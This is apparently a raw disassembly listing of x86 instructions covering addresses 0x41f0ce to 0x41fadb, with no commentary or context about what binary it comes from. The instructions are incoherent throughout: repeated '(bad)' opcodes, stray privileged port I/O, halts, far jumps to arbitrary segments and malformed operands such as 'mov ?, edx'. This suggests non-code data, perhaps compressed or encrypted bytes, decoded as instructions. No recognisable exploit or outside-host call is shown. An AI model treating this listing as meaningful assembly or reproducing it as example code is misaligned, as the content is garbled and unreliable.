  41f0ce:	retf   0x62cd
  41f0d1:	dec    eax
  41f0d2:	dec    esp
  41f0d3:	ret    
  41f0d4:	sahf   
  41f0d5:	sbb    DWORD PTR [edi],esp
  41f0d7:	jge    0x41f0fc
  41f0d9:	fdivr  QWORD PTR [esi-0x22a790b3]
  41f0df:	ss sub eax,0x8c889c6c
  41f0e5:	shl    ch,cl
  41f0e7:	lods   al,BYTE PTR ds:[esi]
  41f0e8:	and    DWORD PTR [edi+ebx*2],esi
  41f0eb:	fnstenv [ebx+0x3a]
  41f0ee:	jbe    0x41f095
  41f0f0:	nop
  41f0f1:	mov    eax,ds:0x99be8b22
  41f0f7:	sub    ch,BYTE PTR [ebx-0x1f]
  41f0fa:	inc    esp
  41f0fb:	mov    ch,0x60
  41f0fd:	sub    dh,BYTE PTR [ecx]
  41f0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f100:	jns    0x41f138
  41f102:	dec    eax
  41f103:	push   ebx
  41f104:	icebp  
  41f105:	out    0x3f,al
  41f107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f108:	mov    edx,0xf6dbe34a
  41f10d:	cld    
  41f10e:	mov    esp,0x582c
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x31ad80da
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xed000001
  41f18d:	jnp    0x41f1b9
  41f18f:	dec    edi
  41f190:	dec    DWORD PTR [edi-0x29603a5]
  41f196:	mov    bh,0x7d
  41f198:	ins    DWORD PTR es:[edi],dx
  41f199:	mov    al,ds:0x21a801a1
  41f19e:	add    al,bh
  41f1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a1:	mov    ds:0x1e445580,eax
  41f1a6:	xchg   ecx,eax
  41f1a7:	and    ebp,DWORD PTR [eax-0x31]
  41f1aa:	data16 jp 0x41f1a4
  41f1ad:	fs cmc 
  41f1af:	sbb    edi,ecx
  41f1b1:	mov    DWORD PTR [eax+ebp*1+0x1b],eax
  41f1b5:	dec    eax
  41f1b6:	lock add edx,DWORD PTR [edi-0x58]
  41f1ba:	pop    es
  41f1bb:	clc    
  41f1bc:	test   bl,bl
  41f1be:	fwait
  41f1bf:	mov    ch,BYTE PTR ds:0xee0b7983
  41f1c5:	(bad)  
  41f1c6:	and    ebx,ecx
  41f1c8:	mov    es,edx
  41f1ca:	dec    esp
  41f1cb:	es jg  0x41f1aa
  41f1ce:	push   edi
  41f1cf:	add    esp,DWORD PTR [ebx-0x1fd25d97]
  41f1d5:	mov    eax,ds:0xee7efc1e
  41f1da:	inc    ebx
  41f1db:	jecxz  0x41f23d
  41f1dd:	add    DWORD PTR [ebp+ecx*8+0x65],ecx
  41f1e1:	(bad)  
  41f1e2:	jg     0x41f22e
  41f1e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1e5:	fnstsw WORD PTR [eax-0x2efe6e36]
  41f1eb:	mov    ds:0xdead09db,eax
  41f1f0:	neg    BYTE PTR [ecx+0x57]
  41f1f3:	fild   DWORD PTR [esi-0x72ba15dd]
  41f1f9:	fdiv   DWORD PTR [edi]
  41f1fb:	mov    eax,0xc865cb21
  41f200:	rcr    ch,0xce
  41f203:	fnstenv [ebp+0x75]
  41f206:	lock push ebx
  41f208:	sbb    eax,DWORD PTR [edi+0x1c6e8d36]
  41f20e:	addr16 mov dh,0xfb
  41f211:	daa    
  41f212:	ins    BYTE PTR es:[edi],dx
  41f213:	mov    edx,0xe82b1f01
  41f218:	and    eax,0xd8050f6
  41f21d:	sbb    al,0xff
  41f21f:	enter  0x12c2,0xda
  41f223:	hlt    
  41f224:	clc    
  41f225:	or     al,0xb1
  41f227:	call   0x722a0b56
  41f22c:	outs   dx,BYTE PTR ds:[esi]
  41f22d:	mov    bl,0x2e
  41f22f:	sbb    bh,bh
  41f231:	pusha  
  41f232:	mov    cl,0x5a
  41f234:	mov    ebx,DWORD PTR [ebp-0x27e356c2]
  41f23a:	sbb    al,0x4b
  41f23c:	cmp    al,0x9e
  41f23e:	xchg   ebp,eax
  41f23f:	adc    DWORD PTR [edx+ebp*1+0x6e],edx
  41f243:	shr    DWORD PTR [ebx],cl
  41f245:	jecxz  0x41f256
  41f247:	mov    al,ds:0x6fd75c16
  41f24c:	arpl   WORD PTR [edi],dx
  41f24e:	fisttp WORD PTR fs:[edi-0x43]
  41f252:	mov    dl,0x81
  41f254:	inc    eax
  41f255:	adc    al,0xc4
  41f257:	fs out dx,al
  41f259:	pop    ds
  41f25a:	test   ebx,ebx
  41f25c:	fdiv   QWORD PTR [ebp+0x2ea6dd48]
  41f262:	in     eax,0x81
  41f264:	(bad)  
  41f265:	ss xchg edx,eax
  41f267:	dec    ebp
  41f268:	inc    eax
  41f269:	shr    esi,1
  41f26b:	xchg   ebp,eax
  41f26c:	pop    eax
  41f26d:	cli    
  41f26e:	rcr    DWORD PTR [ecx],cl
  41f270:	mov    edi,0x8974792b
  41f275:	dec    ecx
  41f276:	mov    al,0xa3
  41f278:	hlt    
  41f279:	pushf  
  41f27a:	push   cs
  41f27b:	neg    BYTE PTR ds:0x5f8a0b0b
  41f281:	fnstcw WORD PTR [esp+esi*8-0x70328f77]
  41f288:	xor    eax,0xa277bbf0
  41f28d:	(bad)  
  41f28e:	out    dx,ax
  41f290:	test   DWORD PTR [eax],0x0
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f34b
  41f301:	sub    bh,BYTE PTR [edx+0x31]
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x9d000001
  41f30d:	cli    
  41f30e:	(bad)  
  41f30f:	lods   eax,DWORD PTR ds:[esi]
  41f310:	stc    
  41f311:	std    
  41f312:	jg     0x41f375
  41f314:	fist   DWORD PTR [esi+0x687c29a4]
  41f31a:	rcl    BYTE PTR [edi+0x53],0x37
  41f31e:	adc    eax,0xd5aa20ac
  41f323:	and    ecx,eax
  41f325:	mov    ah,0xe3
  41f327:	cmp    al,0xc9
  41f329:	inc    ecx
  41f32a:	iret   
  41f32b:	push   edx
  41f32c:	or     ebx,DWORD PTR [esi-0x29]
  41f32f:	jp     0x41f39f
  41f331:	sub    BYTE PTR [eax+0x1b],0xee
  41f335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f336:	sbb    al,0x1b
  41f338:	add    BYTE PTR [esi],al
  41f33a:	dec    ebx
  41f33b:	js     0x41f2d9
  41f33d:	push   cs
  41f33e:	mov    ds,WORD PTR [eax+0x13]
  41f341:	inc    ebx
  41f342:	mov    esi,0x2ff91255
  41f347:	add    ch,BYTE PTR ds:[edx]
  41f34a:	psraw  mm5,QWORD PTR [ecx+ecx*4-0x6]
  41f34f:	sbb    DWORD PTR [esi-0x8],eax
  41f352:	push   esi
  41f353:	retf   
  41f354:	(bad)  
  41f355:	in     al,0x70
  41f357:	push   cs
  41f358:	mov    BYTE PTR [ebx-0x5ffeaa56],cl
  41f35e:	lock pop esi
  41f360:	out    0xae,al
  41f362:	nop
  41f363:	call   0x3fa8:0xe4af0c4f
  41f36a:	push   es
  41f36b:	push   eax
  41f36c:	loopne 0x41f3ea
  41f36e:	jmp    0xa561:0xcff7ad38
  41f375:	xchg   ecx,eax
  41f376:	mov    WORD PTR [edi],ss
  41f378:	std    
  41f379:	fcmovnb st,st(5)
  41f37b:	ins    DWORD PTR es:[edi],dx
  41f37c:	aas    
  41f37d:	pushf  
  41f37e:	xor    DWORD PTR [ebp-0x7b8ca3ae],esi
  41f384:	mov    ebx,0x8ac4203e
  41f389:	adc    eax,0xf2ab59bb
  41f38e:	pop    DWORD PTR [esi-0x28]
  41f391:	sar    ebx,cl
  41f393:	out    0xa3,al
  41f395:	sbb    eax,0x4a3ea26d
  41f39a:	dec    ebx
  41f39b:	pop    ecx
  41f39c:	push   0x697a8a61
  41f3a1:	test   eax,0xc475bad9
  41f3a6:	mov    dl,0x0
  41f3a8:	mov    dh,0xc1
  41f3aa:	jp     0x41f331
  41f3ac:	dec    ecx
  41f3ad:	and    bl,BYTE PTR [edi-0x53]
  41f3b0:	sub    eax,0x8478d231
  41f3b5:	xor    ah,bl
  41f3b7:	jg     0x41f3b2
  41f3b9:	inc    eax
  41f3ba:	inc    ebx
  41f3bb:	xchg   esp,eax
  41f3bc:	adc    BYTE PTR [esi],bh
  41f3be:	aam    0xf5
  41f3c0:	enter  0xb7af,0x5c
  41f3c4:	inc    esi
  41f3c5:	xchg   ecx,eax
  41f3c6:	jae    0x41f3fa
  41f3c8:	ins    BYTE PTR es:[edi],dx
  41f3c9:	scas   al,BYTE PTR es:[edi]
  41f3ca:	int3   
  41f3cb:	pop    edi
  41f3cc:	push   ss
  41f3cd:	and    eax,0x748003b5
  41f3d2:	mov    al,0x52
  41f3d4:	in     eax,dx
  41f3d5:	cs dec esp
  41f3d7:	sbb    BYTE PTR [ebp-0x24],0xb2
  41f3db:	dec    esi
  41f3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3dd:	retf   0xcc0a
  41f3e0:	add    DWORD PTR [esi-0x2e9f7183],eax
  41f3e6:	mov    esp,0x119ae85f
  41f3eb:	js     0x41f413
  41f3ed:	sbb    dl,BYTE PTR [ebx-0x3e]
  41f3f0:	jmp    0x41f3b6
  41f3f2:	test   BYTE PTR [eax+0x5a25ef84],al
  41f3f8:	xchg   edi,eax
  41f3f9:	push   es
  41f3fa:	out    dx,eax
  41f3fb:	push   ss
  41f3fc:	xchg   esi,eax
  41f3fd:	sbb    DWORD PTR [esi-0x3c6ec28],ebx
  41f403:	out    dx,al
  41f404:	mov    ?,WORD PTR [ebp+0x22]
  41f407:	hlt    
  41f408:	push   ss
  41f409:	xor    esp,esi
  41f40b:	or     al,0x94
  41f40d:	sahf   
  41f40e:	sbb    bl,BYTE PTR [ecx+0xbc]
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x3a
  41f481:	dec    edx
  41f482:	inc    esp
  41f483:	cmp    DWORD PTR gs:[ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0xea000001,al
  41f48d:	mov    bh,0xdb
  41f48f:	jbe    0x41f41b
  41f491:	inc    esi
  41f493:	ins    DWORD PTR es:[edi],dx
  41f494:	sub    eax,0x661e98b2
  41f499:	fst    QWORD PTR [edi-0x74]
  41f49c:	dec    ebp
  41f49d:	jmp    FWORD PTR [ebp-0x6d]
  41f4a0:	cmp    ebp,edi
  41f4a2:	mov    ?,edx
  41f4a4:	mov    ds:0x11189065,eax
  41f4a9:	iret   
  41f4aa:	mov    ebp,0xb0dce071
  41f4af:	out    dx,eax
  41f4b0:	mov    bh,BYTE PTR [ebx-0x3c88ebbc]
  41f4b6:	xchg   BYTE PTR [edi],ah
  41f4b8:	(bad)  
  41f4b9:	and    ebx,DWORD PTR [edi-0x22]
  41f4bc:	xchg   DWORD PTR [ebp-0x4a],esp
  41f4bf:	xchg   edx,eax
  41f4c0:	mov    ds:0x27f78e7e,al
  41f4c5:	sub    ebp,DWORD PTR [ecx+0x31]
  41f4c8:	add    BYTE PTR [esi+esi*4-0x20387e82],al
  41f4cf:	sbb    esi,DWORD PTR [esi-0x60]
  41f4d2:	mov    ah,0xe1
  41f4d4:	rcr    BYTE PTR [edx+0x63],0x43
  41f4d8:	xchg   ebx,eax
  41f4d9:	enter  0x6a37,0xe0
  41f4dd:	pop    edx
  41f4de:	pop    ecx
  41f4df:	repnz sub BYTE PTR [eax-0x29e8aca7],dl
  41f4e6:	mov    dh,0x96
  41f4e8:	leave  
  41f4e9:	inc    esi
  41f4ea:	les    edi,FWORD PTR [ebp+0x50]
  41f4ed:	stc    
  41f4ee:	xchg   DWORD PTR es:0xd058726f,ebp
  41f4f5:	(bad)  
  41f4f6:	fdivr  DWORD PTR [edx-0x7b]
  41f4f9:	pop    esp
  41f4fa:	xlat   BYTE PTR ds:[ebx]
  41f4fb:	outs   dx,BYTE PTR ds:[esi]
  41f4fc:	and    al,cl
  41f4fe:	push   esi
  41f4ff:	sbb    DWORD PTR [edx-0x3cb9a453],0xffffffa5
  41f506:	dec    edi
  41f507:	or     DWORD PTR [ecx+0x56d40dc9],esi
  41f50d:	add    ebp,DWORD PTR [ebx+0x74]
  41f510:	leave  
  41f511:	pusha  
  41f512:	dec    ebx
  41f513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f514:	and    al,0x67
  41f516:	adc    DWORD PTR [esi],0x77
  41f519:	imul   ecx,DWORD PTR [ebp-0x32],0x5e
  41f51d:	and    al,0x47
  41f51f:	addr16 pop es
  41f521:	daa    
  41f522:	(bad)  
  41f523:	cmp    eax,0x26ad4f2d
  41f528:	mov    esp,0xa647f458
  41f52d:	mov    dl,0x4f
  41f52f:	call   0x6aea669b
  41f534:	jno    0x41f4d6
  41f536:	mov    esp,0xc16e86e5
  41f53b:	(bad)
  41f53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f53f:	test   DWORD PTR [eax],0xf060fc9a
  41f545:	xor    al,0x7
  41f547:	jmp    0xa00d44b2
  41f54c:	adc    al,0x2e
  41f54e:	rcl    DWORD PTR [eax-0x29],cl
  41f551:	out    dx,eax
  41f552:	cmp    eax,0xfeef7481
  41f557:	sbb    eax,0xf8074a33
  41f55c:	mov    ah,0x84
  41f55e:	push   eax
  41f55f:	mov    ebp,0x7f4c7a5a
  41f564:	loopne 0x41f5b1
  41f566:	dec    edi
  41f567:	cmp    BYTE PTR [ebp+0x13],ah
  41f56a:	addr16 push edi
  41f56c:	cwde   
  41f56d:	gs scas eax,DWORD PTR es:[edi]
  41f56f:	xor    al,0x25
  41f571:	icebp  
  41f572:	mov    esp,ebx
  41f574:	ins    DWORD PTR es:[edi],dx
  41f575:	push   0x35
  41f577:	add    al,0x5e
  41f579:	ds pop ds
  41f57b:	mov    WORD PTR [ebx],gs
  41f57d:	mov    ecx,gs
  41f57f:	nop
  41f580:	sbb    dl,0x65
  41f583:	aaa    
  41f584:	fdivr  DWORD PTR [edi+edi*1-0x7516f70f]
  41f58b:	fs sub eax,0x8fd28755
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x960d:0x23cfd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x85000001
  41f60d:	test   BYTE PTR [edx],bl
  41f60f:	aaa    
  41f610:	inc    edi
  41f611:	jmp    0x5199736c
  41f616:	fisubr DWORD PTR [edx-0x62ef7557]
  41f61c:	xchg   ebp,eax
  41f61d:	dec    edi
  41f61e:	sahf   
  41f61f:	fist   WORD PTR ds:0xe553662f
  41f625:	mov    esi,0x4362d2e8
  41f62a:	xchg   ebx,eax
  41f62b:	retf   0xc094
  41f62e:	cmc    
  41f62f:	(bad)  
  41f630:	mov    ebp,0x861f96da
  41f635:	or     eax,DWORD PTR [esi+0x293edd7d]
  41f63b:	mov    al,0x71
  41f63d:	jae    0x41f696
  41f63f:	ins    BYTE PTR es:[edi],dx
  41f640:	hlt    
  41f641:	arpl   WORD PTR [edi-0x3fd53451],bp
  41f647:	retf   
  41f648:	pop    ebp
  41f649:	push   0xffffff85
  41f64b:	prefetch BYTE PTR [ecx+edx*1+0x5457556f]
  41f653:	fldenv [ebp+0xa]
  41f656:	xor    al,0x95
  41f658:	loop   0x41f61b
  41f65a:	or     DWORD PTR [eax-0x35de5404],ebp
  41f660:	jg     0x41f61e
  41f662:	out    0xc9,al
  41f664:	fcom   QWORD PTR [edi+0x45]
  41f667:	mov    eax,0x93cb3f6f
  41f66c:	xor    ah,al
  41f66e:	adc    al,0x6
  41f670:	int    0x49
  41f672:	add    eax,0xbc51a3cf
  41f677:	les    edx,FWORD PTR [edi+eiz*4]
  41f67a:	xchg   edi,eax
  41f67b:	dec    ecx
  41f67c:	gs out dx,al
  41f67e:	sbb    cl,BYTE PTR [ebx+0x4a]
  41f681:	xor    esp,DWORD PTR ds:[edi]
  41f684:	add    eax,0xe91ea35
  41f689:	or     DWORD PTR [esi+0x67a1606e],edx
  41f68f:	mov    dl,0x31
  41f691:	rcl    BYTE PTR [edi-0x42],cl
  41f694:	mov    ebp,0x74ec2339
  41f699:	and    DWORD PTR [esi],edi
  41f69b:	or     al,0x45
  41f69d:	pop    es
  41f69e:	mov    ch,0x78
  41f6a0:	nop
  41f6a1:	jl     0x41f6c1
  41f6a3:	mov    dl,0x34
  41f6a5:	pop    edi
  41f6a6:	jnp    0x41f64e
  41f6a8:	int3   
  41f6a9:	xor    ch,BYTE PTR [ebp+0x5e]
  41f6ac:	bound  esp,QWORD PTR [ebp-0x69940dc3]
  41f6b2:	in     al,0x49
  41f6b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b5:	(bad)  
  41f6b6:	xchg   edi,eax
  41f6b7:	les    ebp,FWORD PTR [ebx+0x44]
  41f6ba:	pop    esi
  41f6bb:	sub    bh,BYTE PTR [ecx-0x34]
  41f6be:	out    0xae,eax
  41f6c0:	adc    al,0xbd
  41f6c2:	add    al,dl
  41f6c4:	test   BYTE PTR [esi+0x3d],ah
  41f6c7:	jmp    0x41f70d
  41f6c9:	adc    edx,DWORD PTR [ecx+ecx*2+0x28896746]
  41f6d0:	jl     0x41f6a1
  41f6d2:	stos   WORD PTR es:[edi],ax
  41f6d4:	jle    0x41f69b
  41f6d6:	ss data16 sub ah,dl
  41f6da:	xchg   edi,eax
  41f6db:	sub    BYTE PTR [eax+0x7b],al
  41f6de:	imul   bh
  41f6e0:	test   eax,0xf4f3750f
  41f6e5:	daa    
  41f6e6:	jb     0x41f731
  41f6e8:	mov    edi,0xd57027b1
  41f6ed:	push   0x52
  41f6ef:	das    
  41f6f0:	enter  0x2d3a,0x20
  41f6f4:	popa   
  41f6f5:	(bad)  
  41f6f6:	retf   0x3bc8
  41f6f9:	sbb    BYTE PTR [esi+esi*2+0x5a],0xcd
  41f6fe:	js     0x41f717
  41f700:	mov    cl,0x16
  41f702:	mov    ds:0xdd51391d,eax
  41f707:	leave  
  41f708:	sub    ch,BYTE PTR [ecx-0x56]
  41f70b:	shl    bh,0xe0
  41f70e:	push   edi
  41f70f:	jnp    0x41f693
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xdd04:0x166c62d2
  41f783:	imul   eax,DWORD PTR [ebx+0x4f],0x1
  41f787:	add    BYTE PTR ds:0x3c000001,al
  41f78d:	push   esi
  41f78e:	int3   
  41f78f:	mov    edi,0x75f8ffe2
  41f794:	mov    esp,0x70b96ee
  41f799:	mov    bh,dh
  41f79b:	push   ss
  41f79c:	lods   al,BYTE PTR ds:[esi]
  41f79d:	sti    
  41f79e:	out    dx,al
  41f79f:	jmp    0x41f7e4
  41f7a1:	mov    bl,0xf8
  41f7a3:	icebp  
  41f7a4:	xchg   edx,eax
  41f7a5:	test   al,0x4d
  41f7a7:	add    DWORD PTR [eax-0x15a9060],ebp
  41f7ad:	add    DWORD PTR [eax+ecx*8+0x390f6c04],eax
  41f7b4:	repnz xchg ebp,eax
  41f7b6:	inc    edx
  41f7b7:	pop    ecx
  41f7b8:	stos   BYTE PTR es:[edi],al
  41f7b9:	mov    bl,0x3
  41f7bb:	inc    ecx
  41f7bc:	les    ecx,FWORD PTR [ebx+ebp*2]
  41f7bf:	out    0x76,eax
  41f7c1:	call   FWORD PTR [ebp-0x26]
  41f7c4:	test   eax,0x40457a50
  41f7c9:	dec    eax
  41f7ca:	mov    DWORD PTR [esi+0x41],esp
  41f7cd:	stos   BYTE PTR es:[edi],al
  41f7ce:	mov    ah,0x8
  41f7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d1:	loopne 0x41f7fa
  41f7d3:	shl    DWORD PTR [eax],cl
  41f7d5:	pop    edi
  41f7d6:	push   eax
  41f7d7:	call   0x30443158
  41f7dc:	or     eax,0xde629288
  41f7e1:	sbb    cl,BYTE PTR [eax+0x20863867]
  41f7e7:	lods   al,BYTE PTR ds:[esi]
  41f7e8:	test   DWORD PTR [eax+0x25],ecx
  41f7eb:	cmp    BYTE PTR [ebp+0x4276a619],bh
  41f7f1:	push   esi
  41f7f2:	shl    BYTE PTR [edi],1
  41f7f4:	xchg   ah,bh
  41f7f6:	dec    esi
  41f7f7:	mov    cs,WORD PTR [ebp+0x34f2136a]
  41f7fd:	je     0x41f7db
  41f7ff:	es in  eax,dx
  41f801:	repnz enter 0x3bdb,0x3c
  41f806:	pop    ds
  41f807:	cld    
  41f808:	mov    edx,0x3a2ba91d
  41f80d:	dec    edi
  41f80e:	jnp    0x41f7f5
  41f810:	mov    esp,esi
  41f812:	(bad)  
  41f813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f814:	and    eax,DWORD PTR [edi+0x23ff6c39]
  41f81a:	dec    ecx
  41f81b:	and    DWORD PTR [edi+0x2f],ebp
  41f81e:	dec    edi
  41f81f:	stos   DWORD PTR es:[edi],eax
  41f820:	pushf  
  41f821:	hlt    
  41f822:	pop    es
  41f823:	dec    ebx
  41f824:	sahf   
  41f825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f826:	mov    eax,0x7bda6add
  41f82b:	fcomp  DWORD PTR [edx-0x62451af0]
  41f831:	mov    ch,0x35
  41f833:	sbb    al,0xeb
  41f835:	fisubr DWORD PTR [esi-0x2ff235cb]
  41f83b:	inc    edx
  41f83c:	sar    BYTE PTR [ecx+0x31237be7],0xc4
  41f843:	and    bl,BYTE PTR [edx-0x65eaba7c]
  41f849:	xor    eax,0xf681df76
  41f84e:	mov    al,0xb4
  41f850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f851:	xor    BYTE PTR [ecx],ch
  41f853:	into   
  41f854:	and    al,0xf2
  41f856:	stos   DWORD PTR es:[edi],eax
  41f857:	daa    
  41f858:	lods   eax,DWORD PTR ds:[esi]
  41f859:	push   ebp
  41f85a:	loop   0x41f83e
  41f85c:	stos   BYTE PTR es:[edi],al
  41f85d:	ret    0xc031
  41f860:	(bad)  
  41f861:	cld    
  41f862:	jae    0x41f8e0
  41f864:	sbb    dl,BYTE PTR [ecx+0x2f]
  41f867:	test   DWORD PTR [edx],0xfdeb6904
  41f86d:	lds    eax,FWORD PTR [ebp-0x261bad00]
  41f873:	mov    ?,ecx
  41f875:	es aaa 
  41f877:	and    DWORD PTR [edi+0x12693e59],edx
  41f87d:	sbb    edx,0x9b959527
  41f883:	fsubr  DWORD PTR [eax+0x5211ba79]
  41f889:	repz sub cl,dh
  41f88c:	xlat   BYTE PTR ds:[ebx]
  41f88d:	mov    dh,0x67
  41f88f:	xchg   ecx,eax
  41f890:	popf   
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	push   ebx
  41f901:	push   0x45
  41f903:	test   eax,0x15048
  41f908:	add    eax,0x80000001
  41f90d:	pop    ebp
  41f90e:	lahf   
  41f90f:	adc    eax,0xb7f4d32a
  41f914:	clc    
  41f915:	neg    edx
  41f917:	pop    ds
  41f918:	jle    0x41f915
  41f91a:	pop    ebx
  41f91b:	cmp    eax,0x38f5cc53
  41f920:	test   BYTE PTR [ebx-0x6d06ddc7],cl
  41f926:	inc    ebp
  41f927:	mov    esp,0xcf7095e0
  41f92c:	xchg   ebx,eax
  41f92d:	xchg   esi,eax
  41f92e:	cmp    DWORD PTR [ecx+ebp*8+0x27],eax
  41f932:	mov    ds:0x5fc09297,al
  41f937:	dec    edx
  41f938:	cld    
  41f939:	and    DWORD PTR [ecx-0x4d],eax
  41f93c:	(bad)  
  41f93d:	cmp    edi,DWORD PTR [ebx]
  41f93f:	mov    eax,0x8fef8ba6
  41f944:	cli    
  41f945:	pop    ss
  41f946:	add    ebx,ecx
  41f948:	aas    
  41f949:	jp     0x41f934
  41f94b:	icebp  
  41f94c:	jne    0x41f94f
  41f94e:	in     eax,dx
  41f94f:	mov    eax,edi
  41f951:	mov    ah,BYTE PTR [ebp+ebx*4+0x58]
  41f955:	mov    dh,0x22
  41f957:	push   ebx
  41f958:	jmp    0x41f9a1
  41f95a:	sti    
  41f95b:	std    
  41f95c:	sbb    esp,0xa8cdc4ad
  41f962:	(bad)
  41f965:	adc    esp,DWORD PTR [edx+0x3b]
  41f968:	and    dh,cl
  41f96a:	jb     0x41f9e8
  41f96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96d:	xchg   ecx,eax
  41f96e:	gs std 
  41f970:	call   0x66b7:0x295e2438
  41f977:	pop    ebp
  41f978:	popw   ss
  41f97a:	pop    ebp
  41f97b:	daa    
  41f97c:	fwait
  41f97d:	inc    ebx
  41f97e:	sub    al,bl
  41f980:	pop    eax
  41f981:	xlat   BYTE PTR ds:[ebx]
  41f982:	pop    ebx
  41f983:	(bad)  
  41f984:	xchg   edi,eax
  41f985:	xlat   BYTE PTR ds:[ebx]
  41f986:	xchg   esi,eax
  41f987:	(bad)  
  41f988:	in     al,0x5
  41f98a:	aad    0xe2
  41f98c:	fild   DWORD PTR [edi]
  41f98e:	nop
  41f98f:	pop    edi
  41f990:	clc    
  41f991:	adc    DWORD PTR [eax+edx*1+0x261fb74],edi
  41f998:	adc    BYTE PTR [ebx+0x4c259f12],dl
  41f99e:	pop    es
  41f99f:	sub    al,dh
  41f9a1:	or     cl,bl
  41f9a3:	test   DWORD PTR [eax],eax
  41f9a5:	xor    esp,DWORD PTR [ecx-0x1e0acdc6]
  41f9ab:	dec    esi
  41f9ac:	add    al,0x14
  41f9ae:	mov    eax,0x46901fd0
  41f9b3:	std    
  41f9b4:	adc    BYTE PTR [ecx-0x7a0346b4],0x7d
  41f9bb:	inc    eax
  41f9bc:	imul   ebx,ecx,0x9f4f9749
  41f9c2:	inc    esi
  41f9c3:	push   ebx
  41f9c4:	push   0x17189d8f
  41f9c9:	pop    ebx
  41f9ca:	clc    
  41f9cb:	xor    esi,DWORD PTR [esi]
  41f9cd:	or     bh,ah
  41f9cf:	leave  
  41f9d0:	mov    ss,edx
  41f9d2:	add    eax,0x5939c540
  41f9d7:	aad    0xfa
  41f9d9:	jg     0x41fa51
  41f9db:	fild   DWORD PTR [esp+edi*1]
  41f9de:	mov    eax,ds:0x7d085b01
  41f9e3:	mov    BYTE PTR [esi],ah
  41f9e5:	fbstp  TBYTE PTR [ebx-0x66]
  41f9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9e9:	or     al,0xe2
  41f9eb:	jl     0x41f973
  41f9ed:	loop   0x41f998
  41f9ef:	daa    
  41f9f0:	adc    bh,BYTE PTR ds:0xc6757fd4
  41f9f6:	mov    bh,0xe4
  41f9f8:	addr16 mov ch,0xa
  41f9fb:	fstp   QWORD PTR [ecx+0x7a]
  41f9fe:	iret   
  41f9ff:	push   ebp
  41fa00:	mov    ebx,0x4ea03a72
  41fa05:	popa   
  41fa06:	int    0x69
  41fa08:	inc    eax
  41fa09:	mov    bh,0x8c
  41fa0b:	daa    
  41fa0c:	lods   eax,DWORD PTR ds:[esi]
  41fa0d:	bound  edx,QWORD PTR [esi+0x5599]
	...
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x427a2515,eax
  41fa83:	lahf   
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x9000001
  41fa8d:	or     ch,ah
  41fa8f:	mov    ds:0xcee6a68d,eax
  41fa94:	xor    al,cl
  41fa96:	lea    ecx,[eax]
  41fa98:	jae    0x41fafb
  41fa9a:	in     eax,0x3f
  41fa9c:	jo     0x41fabf
  41fa9e:	pop    edx
  41fa9f:	lods   al,BYTE PTR ds:[esi]
  41faa0:	and    eax,0x63c268e0
  41faa5:	fmul   QWORD PTR [edi+0x5e]
  41faa8:	mov    bl,0x37
  41faaa:	jnp    0x41fa31
  41faac:	sbb    eax,0x874573a4
  41fab1:	cmp    bl,BYTE PTR [esi+0x29]
  41fab4:	js     0x41fa3a
  41fab6:	and    BYTE PTR [eax-0x24],al
  41fab9:	in     al,0xea
  41fabb:	jmp    0x62576244
  41fac0:	jp     0x41fa74
  41fac2:	sub    eax,0x9aed3b70
  41fac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac8:	mov    cl,0x85
  41faca:	jno    0x41fb15
  41facc:	xchg   ecx,eax
  41facd:	mov    cl,0x84
  41facf:	(bad)  
  41fad0:	xchg   edi,eax
  41fad1:	(bad)  
  41fad2:	cli    
  41fad3:	in     al,0xb1
  41fad5:	mov    eax,ds:0x492f18c5
  41fada:	push   esi
  41fadb:	or     eax,0xa98c2431
